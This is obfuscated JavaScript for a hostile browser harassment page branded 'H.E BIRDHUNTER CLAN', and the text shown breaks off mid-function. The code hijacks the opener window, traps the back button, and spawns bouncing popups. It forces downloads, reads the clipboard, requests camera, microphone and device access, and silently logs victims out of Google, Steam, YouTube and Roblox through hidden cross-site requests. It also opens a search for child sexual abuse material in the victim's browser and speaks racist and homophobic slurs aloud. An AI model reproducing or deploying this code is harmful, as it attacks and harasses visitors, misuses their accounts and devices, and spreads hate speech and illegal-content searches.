const SCREEN_WIDTH = window.screen.availWidth,
  SCREEN_HEIGHT = window.screen.availHeight,
  WIN_WIDTH = 500
const WIN_HEIGHT = 500,
  VELOCITY = 70,
  MARGIN = 70,
  TOP_MARGIN = 70,
  TICK_LENGTH = 70,
  HIDDEN_STYLE =
    'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;',
  SEARCHES = ['free child porn videos'],
  VIDEOS = [
    'Wagner.mp4',
    'salad.mp4',
    '0801.mp4',
    'audio.destroy.mp4',
    'mama.mp4',
    'apoop22.mp4',
  ],
  FILE_DOWNLOADS = ['nigga_poop.gif', 'poop_virus.gif'],
  PHRASES = ['H.E CLAN HACKED YOU FAGGOT NIGGER!', 'HACKED BY H.E BIRDHUNTER CLAN!'],
  _0x368b8a = {}
_0x368b8a.action_logout = '1'
const _0x3f3fda = {}
_0x3f3fda.Google = ['GET', 'https://www.google.com/accounts/Logout']
_0x3f3fda['Steam Community'] = [
  'GET',
  'https://steamcommunity.com/?action=doLogout',
]
_0x3f3fda['Steam Store'] = ['GET', 'https://store.steampowered.com/logout/']
_0x3f3fda.YouTube = ['POST', 'https://www.youtube.com', _0x368b8a]
_0x3f3fda.Roblox = ['POST', 'https://www.roblox.com/authentication/logout']
const LOGOUT_SITES = _0x3f3fda,
  wins = []
let interactionCount = 0,
  numSuperLogoutIframes = 0
const isChildWindow =
    (window.opener && isParentSameOrigin()) ||
    window.location.search.indexOf('child=true') !== -1,
  isParentWindow = !isChildWindow
init()
if (isChildWindow) {
  initChildWindow()
} else {
  initParentWindow()
}
function init() {
  const _0x3339ad = (function () {
    const _0x4346b4 = {
      XOEKH: function (_0x19f895, _0x14ea4a) {
        return _0x19f895 < _0x14ea4a
      },
      JQmNU: function (_0x56558a) {
        return _0x56558a()
      },
      FjlWi: function (_0x445b86, _0x5c331c, _0x59beb2) {
        return _0x445b86(_0x5c331c, _0x59beb2)
      },
      etGCL: function (_0xda0565, _0x4bad37) {
        return _0xda0565 !== _0x4bad37
      },
      bteSi: 'RBddN',
      qFcKy: 'VwBYm',
      dUyvQ: 'rLKGp',
      JFLjr: 'opera',
      Zguol: 'The Pajeet Slayer',
      Zcgyo: 'hKtlB',
      TQNxD: 'jYIdd',
    }
    let _0x5e4243 = true
    return function (_0x32aead, _0x2f5cc5) {
      const _0x22e898 = {
        DlZzk: _0x4346b4.JFLjr,
        gmcHA: _0x4346b4.Zguol,
      }
      const _0x5956bd = _0x22e898
      if (_0x4346b4.etGCL(_0x4346b4.Zcgyo, _0x4346b4.TQNxD)) {
        const _0x55a1f2 = _0x5e4243
          ? function () {
              if (_0x4346b4.etGCL(_0x4346b4.bteSi, _0x4346b4.qFcKy)) {
                if (_0x2f5cc5) {
                  if (_0x4346b4.etGCL(_0x4346b4.dUyvQ, _0x4346b4.dUyvQ)) {
                    return _0x5956bd.DlZzk
                  } else {
                    const _0x23ed80 = _0x2f5cc5.apply(_0x32aead, arguments)
                    return (_0x2f5cc5 = null), _0x23ed80
                  }
                }
              } else {
                _0x4346b4.FjlWi(
                  _0x5cd59f,
                  () => {
                    _0x4346b4.XOEKH(_0x3d1d95.random(), 0.5)
                      ? _0x4346b4.JQmNU(_0x370e4e)
                      : _0x23a15b.print()
                  },
                  120000
                )
              }
            }
          : function () {}
        return (_0x5e4243 = false), _0x55a1f2
      } else {
        _0x328c5c.registerProtocolHandler(_0x33e1d0, _0x475fd5, _0x5956bd.gmcHA)
      }
    }
  })()
  ;(function () {
    _0x3339ad(this, function () {
      const _0x331eec = new RegExp('function *\\( *\\)'),
        _0x21aff6 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        _0x17890a = _0x1775f2('init')
      if (
        !_0x331eec.test(_0x17890a + 'chain') ||
        !_0x21aff6.test(_0x17890a + 'input')
      ) {
        _0x17890a('0')
      } else {
        _0x1775f2()
      }
    })()
  })()
  const _0xf20e27 = (function () {
    let _0x3ac9a8 = true
    return function (_0x5d0f68, _0x21f792) {
      const _0x30f8c0 = _0x3ac9a8
        ? function () {
            if (_0x21f792) {
              const _0x4976f9 = _0x21f792.apply(_0x5d0f68, arguments)
              return (_0x21f792 = null), _0x4976f9
            }
          }
        : function () {}
      return (_0x3ac9a8 = false), _0x30f8c0
    }
  })()
  const _0x2e1f0d = _0xf20e27(this, function () {
    let _0x5e8651
    try {
      const _0x3af28a = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x5e8651 = _0x3af28a()
    } catch (_0x361914) {
      _0x5e8651 = window
    }
    const _0x1433fc = (_0x5e8651.console = _0x5e8651.console || {}),
      _0x19fa43 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x208f66 = 0; _0x208f66 < _0x19fa43.length; _0x208f66++) {
      const _0x24a90c = _0xf20e27.constructor.prototype.bind(_0xf20e27),
        _0xdfffd8 = _0x19fa43[_0x208f66],
        _0x523b32 = _0x1433fc[_0xdfffd8] || _0x24a90c
      _0x24a90c['__proto__'] = _0xf20e27.bind(_0xf20e27)
      _0x24a90c.toString = _0x523b32.toString.bind(_0x523b32)
      _0x1433fc[_0xdfffd8] = _0x24a90c
    }
  })
  _0x2e1f0d()
  confirmPageUnload()
  interceptUserInput(async (_0x18d620) => {
    interactionCount += 1
    _0x18d620.preventDefault()
    _0x18d620.stopPropagation()
    interactionCount === 1 && (await showUserIP())
    if (_0x18d620.which !== 0) {
      openWindow()
    }
    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()
    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()
    if (_0x18d620.key === 'Meta' || _0x18d620.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
    } else {
      requestPointerLock()
      requestFullscreen()
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      if (Math.random() < 0.1) {
        requestWebauthnAttestation()
      }
    }
  })
}
function initChildWindow() {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  setupFollowWindow()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()
  interceptUserInput((_0x36bed7) => {
    interactionCount === 1 && startAlertInterval()
  })
}
function initParentWindow() {
  const _0x512c2e = (function () {
      const _0x37d232 = {
        DTuJP: function (_0x305635, _0x13cf9f) {
          return _0x305635 >= _0x13cf9f
        },
        ZHYQg: function (_0x4cb21b, _0xfd31e7) {
          return _0x4cb21b(_0xfd31e7)
        },
        Ksslh: 'usb',
        SfOiO: 'nfc',
        fHBNE: 'ble',
        rcUjd: 'public-key',
        CzcCc: 'Acme',
        UKoSd: 'HACKED_BY_ISHOWPOOP',
        mVFDs: 'YOU ARE HACKED NIGGER!',
        qYjmj: 'direct',
      }
      let _0x39c6b5 = true
      return function (_0x306d43, _0xed32f5) {
        const _0x3f3708 = {
          tJayl: 'video',
          ZNBQx: function (_0x56338f, _0x161d88) {
            return _0x56338f(_0x161d88)
          },
          gbZgq: 'width: 100%; height: 100%;',
          pRXtY: function (_0x4f8002, _0x97c335) {
            return _0x4f8002 !== _0x97c335
          },
          KfUID: 'uJAYp',
          qaZme: 'bqJXR',
          cOJnI: function (_0x1549ac, _0x51316b) {
            return _0x1549ac === _0x51316b
          },
          XfjRm: 'mXAwR',
        }
        const _0x5ea6db = _0x39c6b5
          ? function () {
              const _0x482c92 = {
                SGYuM: _0x3f3708.tJayl,
                SqToC: function (_0x318c3d, _0x39be70) {
                  return _0x3f3708.ZNBQx(_0x318c3d, _0x39be70)
                },
                dBvbx: _0x3f3708.gbZgq,
              }
              if (_0x3f3708.pRXtY(_0x3f3708.KfUID, _0x3f3708.qaZme)) {
                if (_0xed32f5) {
                  if (_0x3f3708.cOJnI(_0x3f3708.XfjRm, _0x3f3708.XfjRm)) {
                    const _0x32f213 = _0xed32f5.apply(_0x306d43, arguments)
                    return (_0xed32f5 = null), _0x32f213
                  } else {
                    const _0x50b1ac = _0x9d5e7a.apply(_0xe8196c, arguments)
                    return (_0x3204d8 = null), _0x50b1ac
                  }
                }
              } else {
                const _0x2e4061 = _0x3e3ffa.createElement(_0x482c92.SGYuM)
                _0x2e4061.src = _0x482c92.SqToC(_0x281ea0, _0xa2b3a)
                _0x2e4061.autoplay = true
                _0x2e4061.loop = true
                _0x2e4061.style = _0x482c92.dBvbx
                _0x531987.body.appendChild(_0x2e4061)
              }
            }
          : function () {}
        return (_0x39c6b5 = false), _0x5ea6db
      }
    })(),
    _0x255f59 = _0x512c2e(this, function () {
      return _0x255f59
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x255f59)
        .search('(((.+)+)+)+$')
    })
  _0x255f59()
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()
  interceptUserInput((_0xc0ff94) => {
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak(
        'H.E CLAN ON TOP, FUCK NIGGERS, FUCK NIGGERS, FUCK NIGGERS, H.E CLAN ON TOP, FUCK NIGGERS, FUCK NIGGERS, FUCK NIGGERS, FUCK NIGGERS, FUCK NIGGERS,  '
      )
    }
  })
  document.body.addEventListener('click', async () => {
    await showUserIP()
  })
}
function attemptToTakeoverReferrerWindow() {
  isParentWindow &&
    window.opener &&
    !isParentSameOrigin() &&
    (window.opener.location = window.location.origin + '/?child=true')
}
function isParentSameOrigin() {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (_0x42693a) {
    return false
  }
}
function confirmPageUnload() {
  window.addEventListener('beforeunload', (_0x2a009d) => {
    speak('HACKED BY H.E BIRDHUNTER CLAN!'), (_0x2a009d.returnValue = true)
  })
}
function registerProtocolHandlers() {
  if (typeof navigator.registerProtocolHandler !== 'function') {
    return
  }
  const _0x3987db = [
      'bitcoin',
      'geo',
      'im',
      'irc',
      'ircs',
      'magnet',
      'mailto',
      'mms',
      'news',
      'ircs',
      'nntp',
      'sip',
      'sms',
      'smsto',
      'ssh',
      'tel',
      'urn',
      'webcal',
      'wtai',
      'xmpp',
    ],
    _0x52be22 = window.location.href + '/url=%s'
  _0x3987db.forEach((_0x32d77d) => {
    navigator.registerProtocolHandler(_0x32d77d, _0x52be22, 'The Pajeet Slayer')
  })
}
function requestCameraAndMic() {
  if (
    !navigator.mediaDevices ||
    typeof navigator.mediaDevices.getUserMedia !== 'function'
  ) {
    return
  }
  navigator.mediaDevices.enumerateDevices().then((_0x74a73b) => {
    const _0x7456fe = _0x74a73b.filter(
      (_0x1a0d8a) => _0x1a0d8a.kind === 'videoinput'
    )
    if (_0x7456fe.length === 0) {
      return
    }
    const _0x2dcbdf = _0x7456fe[_0x7456fe.length - 1],
      _0x441ded = {
        deviceId: _0x2dcbdf.deviceId,
        facingMode: ['user', 'environment'],
        audio: true,
        video: true,
      }
    navigator.mediaDevices.getUserMedia(_0x441ded).then(
      (_0x3b34ef) => {
        const _0x5031a1 = _0x3b34ef.getVideoTracks()[0],
          _0x240aba = new window.ImageCapture(_0x5031a1)
        _0x240aba.getPhotoCapabilities().then(
          () => {
            const _0x5a108a = { advanced: [_0x1c41de] }
            _0x5031a1.applyConstraints(_0x5a108a)
          },
          () => {}
        )
      },
      () => {}
    )
  })
}
function animateUrlWithEmojis() {
  if (window.ApplePaySession) {
    return
  }
  const _0x34b241 = Math.random()
  if (_0x34b241 < 0.33) {
    _0xbf8038()
  } else {
    if (_0x34b241 < 0.67) {
      _0x5f30eb()
    } else {
      _0x55aec4()
    }
  }
  function _0xbf8038() {
    const _0x3252f4 = [
      '\uD83C\uDFFB',
      '\uD83C\uDFFC',
      '\uD83C\uDFFD',
      '\uD83C\uDFFE',
      '\uD83C\uDFFF',
    ]
    setInterval(() => {
      let _0x5f51b4 = '',
        _0x5a19a7,
        _0x209c4c
      for (_0x5a19a7 = 0; _0x5a19a7 < 10; _0x5a19a7++) {
        ;(_0x209c4c = Math.floor(
          _0x3252f4.length * ((Math.sin(Date.now() / 100 + _0x5a19a7) + 1) / 2)
        )),
          (_0x5f51b4 += '\uD83D\uDC76' + _0x3252f4[_0x209c4c])
      }
      window.location.hash = _0x5f51b4
    }, 100)
  }
  function _0x5f30eb() {
    setInterval(() => {
      let _0x25e6ed,
        _0x394c2d,
        _0x3f474c = ''
      for (_0x25e6ed = 0; _0x25e6ed < 10; _0x25e6ed++) {
        _0x394c2d =
          Math.floor(Math.sin(Date.now() / 200 + _0x25e6ed / 2) * 4) + 4
        _0x3f474c += String.fromCharCode(9601 + _0x394c2d)
      }
      window.location.hash = _0x3f474c
    }, 100)
  }
  function _0x55aec4() {
    const _0x575a80 = [
        '\uD83C\uDF11',
        '\uD83C\uDF18',
        '\uD83C\uDF17',
        '\uD83C\uDF16',
        '\uD83C\uDF15',
        '\uD83C\uDF14',
        '\uD83C\uDF13',
        '\uD83C\uDF12',
      ],
      _0x352376 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let _0x31678d = 0
    setInterval(() => {
      let _0x1aa4d1 = '',
        _0x464bed = 0
      if (!_0x31678d) {
        while (_0x352376[_0x464bed] === 4) {
          _0x464bed++
        }
        if (_0x464bed >= _0x352376.length) {
          _0x31678d = 1
        } else {
          _0x352376[_0x464bed]++
        }
      } else {
        while (_0x352376[_0x464bed] === 0) {
          _0x464bed++
        }
        if (_0x464bed >= _0x352376.length) {
          _0x31678d = 0
        } else {
          _0x352376[_0x464bed]++
          if (_0x352376[_0x464bed] === 8) {
            _0x352376[_0x464bed] = 0
          }
        }
      }
      _0x352376.forEach(function (_0x342d61) {
        _0x1aa4d1 += _0x575a80[_0x342d61]
      })
      window.location.hash = _0x1aa4d1
    }, 100)
  }
}
function requestPointerLock() {
  const _0x4d4abb =
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  _0x4d4abb.call(document.body)
}
function startVibrateInterval() {
  if (typeof window.navigator.vibrate !== 'function') {
    return
  }
  setInterval(() => {
    const _0x252ab3 = Math.floor(Math.random() * 600)
    window.navigator.vibrate(_0x252ab3)
  }, 1000)
  window.addEventListener('gamepadconnected', (_0x5ba742) => {
    const _0x5ba820 = _0x5ba742.gamepad
    _0x5ba820.vibrationActuator &&
      setInterval(() => {
        if (_0x5ba820.connected) {
          _0x5ba820.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random(),
          })
        }
      }, 1000)
  })
}
function interceptUserInput(_0x2235c2) {
  const _0x54a431 = {}
  _0x54a431.passive = false
  document.body.addEventListener('touchstart', _0x2235c2, _0x54a431)
  document.body.addEventListener('mousedown', _0x2235c2)
  document.body.addEventListener('mouseup', _0x2235c2)
  document.body.addEventListener('click', _0x2235c2)
  document.body.addEventListener('keydown', _0x2235c2)
  document.body.addEventListener('keyup', _0x2235c2)
  document.body.addEventListener('keypress', _0x2235c2)
}
function startInvisiblePictureInPictureVideo() {
  const _0x3200bc = document.createElement('video')
  _0x3200bc.src = getRandomArrayEntry(VIDEOS)
  _0x3200bc.loop = true
  _0x3200bc.muted = true
  _0x3200bc.style = HIDDEN_STYLE
  _0x3200bc.autoplay = true
  _0x3200bc.play()
  document.body.appendChild(_0x3200bc)
}
function enablePictureInPicture() {
  const _0x4a2b57 = document.querySelector('video')
  document.pictureInPictureEnabled &&
    ((_0x4a2b57.style = ''),
    (_0x4a2b57.muted = false),
    _0x4a2b57.requestPictureInPicture(),
    _0x4a2b57.play())
}
function focusWindows() {
  wins.forEach((_0x502bda) => {
    if (!_0x502bda.closed) {
      _0x502bda.focus()
    }
  })
}
function openWindow() {
  const { x: _0x126b13, y: _0xcef299 } = getRandomCoords(),
    _0x3734d1 =
      'width=' +
      WIN_WIDTH +
      ',height=' +
      WIN_HEIGHT +
      ',left=' +
      _0x126b13 +
      ',top=' +
      _0xcef299
  const _0x9f120 = window.open(window.location.pathname, '', _0x3734d1)
  if (!_0x9f120) {
    return
  }
  wins.push(_0x9f120)
  if (wins.length === 2) {
    setupSearchWindow(_0x9f120)
  }
}
function hideCursor() {
  document.querySelector('html').style = 'cursor: none;'
}
function triggerFileDownload() {
  const _0x52a935 = getRandomArrayEntry(FILE_DOWNLOADS)
  const _0xfc8e81 = document.createElement('a')
  _0xfc8e81.href = _0x52a935
  _0xfc8e81.download = _0x52a935
  _0xfc8e81.click()
}
function speak(_0x5bbef9) {
  if (_0x5bbef9 == null) {
    _0x5bbef9 = getRandomArrayEntry(PHRASES)
  }
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(_0x5bbef9))
}
function startTheramin() {
  const _0x3b9cb0 = new AudioContext(),
    _0x1fe2c4 = _0x3b9cb0.createOscillator()
  const _0x2df822 = _0x3b9cb0.createGain()
  const _0x2a564d = _0x3b9cb0.createPeriodicWave(
    Array(10)
      .fill(0)
      .map((_0x4b9d88, _0x518546) => Math.cos(_0x518546)),
    Array(10)
      .fill(0)
      .map((_0x3cd55f, _0x2e2fa0) => Math.sin(_0x2e2fa0))
  )
  _0x1fe2c4.setPeriodicWave(_0x2a564d)
  _0x1fe2c4.connect(_0x2df822)
  _0x2df822.connect(_0x3b9cb0.destination)
  _0x1fe2c4.start(0)
  const _0x2e4865 = ({ pitch: _0x1dd858, volume: _0x18baae }) => {
    _0x1fe2c4.frequency.value = 50 + _0x1dd858 * 4000
    _0x2df822.gain.value = _0x18baae * 0.5
  }
  document.body.addEventListener('mousemove', (_0x13461e) => {
    const { clientX: _0x29ff87, clientY: _0x44e96b } = _0x13461e,
      { clientWidth: _0x23bcdb, clientHeight: _0x331e44 } = document.body,
      _0x7de1d6 = (_0x29ff87 - _0x23bcdb / 2) / _0x23bcdb,
      _0xed8fb4 = (_0x44e96b - _0x331e44 / 2) / _0x331e44,
      _0x3e1830 = {
        pitch: _0x7de1d6,
        volume: _0xed8fb4,
      }
    _0x2e4865(_0x3e1830)
  })
}
function requestClipboardRead() {
  try {
    navigator.clipboard.readText().then(
      (_0x3e7bf8) => {
        if (!window.ApplePaySession) {
          window.alert(
            "Successfully read data from clipboard: '" + _0x3e7bf8 + "'"
          )
        }
      },
      () => {}
    )
  } catch {}
}
function requestWebauthnAttestation() {
  try {
    const _0x587b95 = { name: 'Acme' }
    const _0x17374e = {
        publicKey: {
          rp: _0x587b95,
          user: {
            id: new Uint8Array(16),
            name: 'HACKED_BY_H.ECLAN',
            displayName: 'YOU ARE HACKED NIGGER!',
          },
          pubKeyCredParams: [
            {
              type: 'public-key',
              alg: -7,
            },
          ],
          attestation: 'direct',
          timeout: 60000,
          challenge: new Uint8Array([
            140, 10, 38, 255, 34, 145, 193, 233, 185, 78, 46, 23, 26, 152, 106,
            115, 113, 157, 67, 72, 213, 167, 106, 21, 126, 56, 148, 82, 119,
            151, 15, 239,
          ]).buffer,
        },
      },
      _0x107ebf = {
        publicKey: {
          timeout: 60000,
          challenge: new Uint8Array([
            121, 80, 104, 113, 218, 238, 238, 185, 148, 195, 194, 21, 103, 101,
            38, 34, 227, 243, 171, 59, 120, 46, 213, 111, 129, 38, 226, 166, 1,
            125, 116, 80,
          ]).buffer,
        },
      }
    navigator.credentials.create(_0x17374e).then((_0x582c27) => {
      const _0x27f18c = {
        id: _0x582c27.rawId,
        transports: ['usb', 'nfc', 'ble'],
        type: 'public-key',
      }
      const _0x2d14fc = [_0x27f18c]
      return (
        (_0x107ebf.publicKey.allowCredentials = _0x2d14fc),
        navigator.credentials.get(_0x107ebf)
      )
    })
  } catch {}
}
function requestMidiAccess() {
  try {
    navigator.requestMIDIAccess(_0x58d0d1)
  } catch {}
}
function requestBluetoothAccess() {
  try {
    const _0x461cd8 = { acceptAllDevices: true }
    navigator.bluetooth
      .requestDevice(_0x461cd8)
      .then((_0x2d18a9) => _0x2d18a9.gatt.connect())
  } catch {}
}
function requestUsbAccess() {
  try {
    const _0x29b1a6 = { filters: [{}] }
    navigator.usb.requestDevice(_0x29b1a6)
  } catch {}
}
;(function () {
  const _0x5d09ec = function () {
    const _0x587756 = { avnPu: 'video' }
    const _0x13f8da = _0x587756
    let _0x4c3d23
    try {
      _0x4c3d23 = Function(
        'return (function() {}.constructor("return this")( ));'
      )()
    } catch (_0x3e1a78) {
      _0x4c3d23 = window
    }
    return _0x4c3d23
  }
  const _0x4c745a = _0x5d09ec()
  _0x4c745a.setInterval(_0x1775f2, 4000)
})()
function requestSerialAccess() {
  try {
    const _0x4fc234 = { filters: [] }
    navigator.serial.requestPort(_0x4fc234)
  } catch {}
}
function requestHidAccess() {
  try {
    const _0xec6227 = { filters: [] }
    navigator.hid.requestDevice(_0xec6227)
  } catch {}
}
function moveWindowBounce() {
  let _0x4a7067 = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let _0x3339d9 = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  setInterval(() => {
    const _0x59a1f4 = window.screenX,
      _0x3a8722 = window.screenY,
      _0x34a3d2 = window.outerWidth,
      _0x178d65 = window.outerHeight
    if (_0x59a1f4 < MARGIN) {
      _0x4a7067 = Math.abs(_0x4a7067)
    }
    if (_0x59a1f4 + _0x34a3d2 > SCREEN_WIDTH - MARGIN) {
      _0x4a7067 = -1 * Math.abs(_0x4a7067)
    }
    if (_0x3a8722 < TOP_MARGIN) {
      _0x3339d9 = Math.abs(_0x3339d9)
    }
    if (_0x3a8722 + _0x178d65 > SCREEN_HEIGHT - MARGIN) {
      _0x3339d9 = -1 * Math.abs(_0x3339d9)
    }
    window.moveBy(_0x4a7067, _0x3339d9)
  }, TICK_LENGTH)
}
function setupFollowWindow() {
  document.addEventListener('mousemove', function (_0x4d9f9) {
    window.moveTo(
      _0x4d9f9.screenX - WIN_WIDTH / 2,
      _0x4d9f9.screenY - WIN_HEIGHT / 2
    )
  })
}
function startVideo() {
  const _0x297a5c = document.createElement('video')
  _0x297a5c.src = getRandomArrayEntry(VIDEOS)
  _0x297a5c.autoplay = true
  _0x297a5c.loop = true
  _0x297a5c.style = 'width: 100%; height: 100%;'
  document.body.appendChild(_0x297a5c)
}
function detectWindowClose() {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) {
      window.opener.onCloseWindow(window)
    }
  })
}
function onCloseWindow(_0x539a2f) {
  const _0x5482b5 = wins.indexOf(_0x539a2f)
  if (_0x5482b5 >= 0) {
    wins.splice(_0x5482b5, 1)
  }
}
function showHelloMessage() {
  const _0x442e57 = document.querySelector('template'),
    _0x54b11b = document.importNode(_0x442e57.content, true)
  document.body.appendChild(_0x54b11b)
}
function removeHelloMessage() {
  const _0x3935b9 = document.querySelector('.hello-message')
  _0x3935b9.remove()
}
function rainbowThemeColor() {
  function _0x47bcc2(_0x37f6cc, _0x63d998, _0x1599b5 = '0') {
    _0x37f6cc -= _0x63d998.toString().length
    if (_0x37f6cc > 0) {
      return (
        new Array(_0x37f6cc + (/\./.test(_0x63d998) ? 2 : 1)).join(_0x1599b5) +
        _0x63d998
      )
    }
    return _0x63d998 + ''
  }
  const _0xd1e51 = document.querySelector('meta.theme-color')
  setInterval(() => {
    _0xd1e51.setAttribute(
      'content',
      '#' + _0x47bcc2(6, Math.floor(Math.random() * 16777215).toString(16))
    )
  }, 50)
}
function copySpamToClipboard() {
  const _0x53ccf4 =
    getRandomArrayEntry(ART) + '\nCheck out https://birdhunter.pages.dev/'
  clipboardCopy(_0x53ccf4)
}
function clipboardCopy(_0x16502d) {
  const _0x2d5537 = document.createElement('span')
  _0x2d5537.textContent = _0x16502d
  _0x2d5537.style.whiteSpace = 'pre'
  const _0x4e03e9 = document.createElement('iframe')
  _0x4e03e9.sandbox = 'allow-same-origin'
  document.body.appendChild(_0x4e03e9)
  let _0x397be9 = _0x4e03e9.contentWindow
  _0x397be9.document.body.appendChild(_0x2d5537)
  let _0x522157 = _0x397be9.getSelection()
  !_0x522157 &&
    ((_0x397be9 = window),
    (_0x522157 = _0x397be9.getSelection()),
    document.body.appendChild(_0x2d5537))
  const _0x1795a1 = _0x397be9.document.createRange()
  _0x522157.removeAllRanges()
  _0x1795a1.selectNode(_0x2d5537)
  _0x522157.addRange(_0x1795a1)
  let _0x2f60fc = false
  try {
    _0x2f60fc = _0x397be9.document.execCommand('copy')
  } catch (_0x3f9487) {
    console.log(_0x3f9487)
  }
  return (
    _0x522157.removeAllRanges(),
    _0x2d5537.remove(),
    _0x4e03e9.remove(),
    _0x2f60fc
  )
}
function startAlertInterval() {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 120000)
}
function showAlert() {
  const _0x40bd08 = getRandomArrayEntry(ART),
    _0x568fa5 = Array(200).join(_0x40bd08)
  window.alert(_0x568fa5)
}
function requestFullscreen() {
  const _0x31aa27 =
    Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen
  _0x31aa27.call(document.body)
}
function superLogout() {
  function _0x46795f(_0x368676, _0x1fe289) {
    if (_0x1fe289) {
      _0x1fe289 = false
      return
    }
    _0x368676.parentNode.removeChild(_0x368676)
  }
  function _0x454f2a(_0x17538f) {
    const _0x5bb350 = document.createElement('img')
    _0x5bb350.onload = () => _0x46795f(_0x5bb350)
    _0x5bb350.onerror = () => _0x46795f(_0x5bb350)
    _0x5bb350.style = HIDDEN_STYLE
    document.body.appendChild(_0x5bb350)
    _0x5bb350.src = _0x17538f
  }
  function _0x48c654(_0x4b861c, _0xe53d23) {
    const _0x1a378b = document.createElement('iframe')
    _0x1a378b.style = HIDDEN_STYLE
    _0x1a378b.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(_0x1a378b)
    numSuperLogoutIframes += 1
    const _0x592e32 = document.createElement('form')
    _0x592e32.style = HIDDEN_STYLE
    let _0x5de2e0 = 0
    _0x1a378b.onload = _0x1a378b.onerror = () => {
      if (_0x5de2e0 >= 1) {
        _0x46795f(_0x1a378b)
      }
      _0x5de2e0 += 1
    }
    _0x592e32.action = _0x4b861c
    _0x592e32.method = 'POST'
    _0x592e32.target = _0x1a378b.name
    for (const _0x100cd4 in _0xe53d23) {
      if (Object.prototype.hasOwnProperty.call(_0xe53d23, _0x100cd4)) {
        const _0x2ee309 = document.createElement('input')
        _0x2ee309.type = 'hidden'
        _0x2ee309.name = _0x100cd4
        _0x2ee309.value = _0xe53d23[_0x100cd4]
        _0x592e32.appendChild(_0x2ee309)
      }
    }
    document.body.appendChild(_0x592e32)
    _0x592e32.submit()
  }
  for (const _0x258cff in LOGOUT_SITES) {
    const _0x3201b0 = LOGOUT_SITES[_0x258cff][0],
      _0x5cb1cc = LOGOUT_SITES[_0x258cff][1],
      _0x2d6bd4 = LOGOUT_SITES[_0x258cff][2] || {}
    if (_0x3201b0 === 'GET') {
      _0x454f2a(_0x5cb1cc)
    } else {
      _0x48c654(_0x5cb1cc, _0x2d6bd4)
    }
    const _0x14d459 = document.createElement('div')
    _0x14d459.innerText = 'Logging you out from ' + _0x258cff + '...'
    const _0x2c0125 = document.querySelector('.logout-messages')
    _0x2c0125.appendChild(_0x14d459)
  }
}
function blockBackButton() {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}
function fillHistory() {
  for (let _0x39c5df = 1; _0x39c5df < 20; _0x39c5df++) {
    window.history.pushState(
      {},
      '',
      window.location.pathname + '?q=' + _0x39c5df
    )
  }
  window.history.pushState({}, '', window.location.pathname)
}
function getRandomCoords() {
  const _0x540495 =
    MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const _0x5a8b63 =
      TOP_MARGIN +
      Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN)),
    _0x1c012b = { x: _0x540495 }
  return (_0x1c012b.y = _0x5a8b63), _0x1c012b
}
function getRandomArrayEntry(_0x94c5d8) {
  return _0x94c5d8[Math.floor(Math.random() * _0x94c5d8.length)]
}
function setupSearchWindow(_0x39e013) {
  if (!_0x39e013) {
    return
  }
  const { x: _0x3246ad, y: _0x3c8012 } = getRandomCoords()
  _0x39e013.moveTo(_0x3246ad, _0x3c8012)
  _0x39e013.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
  _0x39e013.window.location =
    'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let _0x1a1c27 = 1
  const _0x3a6932 = setInterval(() => {
    if (_0x39e013.closed) {
      clearInterval(_0x3a6932)
      onCloseWindow(_0x39e013)
      return
    }
    _0x39e013.window.location = window.location.pathname
    setTimeout(() => {
      _0x39e013.resizeTo(WIN_WIDTH, WIN_HEIGHT)
    }, 500)
    setTimeout(() => {
      const { x: _0x8033fe, y: _0x498d6b } = getRandomCoords()
      _0x39e013.moveTo(_0x8033fe, _0x498d6b)
      _0x39e013.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
      _0x39e013.window.location =
        'https://www.google.com/search?q=' +
        encodeURIComponent(SEARCHES[_0x1a1c27])
      _0x1a1c27 += 1
      if (_0x1a1c27 >= SEARCHES.length) {
        _0x1a1c27 = 0
      }
    }, 1000)
  }, 3000)
}
function detectBrowser() {
  const _0x33f982 = navigator.userAgent
  if (/samsungbrowser\//i.test(_0x33f982)) {
    return 'samsung'
  } else {
    if (/edg\//i.test(_0x33f982)) {
      return 'edge'
    } else {
      if (/edga\//i.test(_0x33f982)) {
        return 'edge'
      } else {
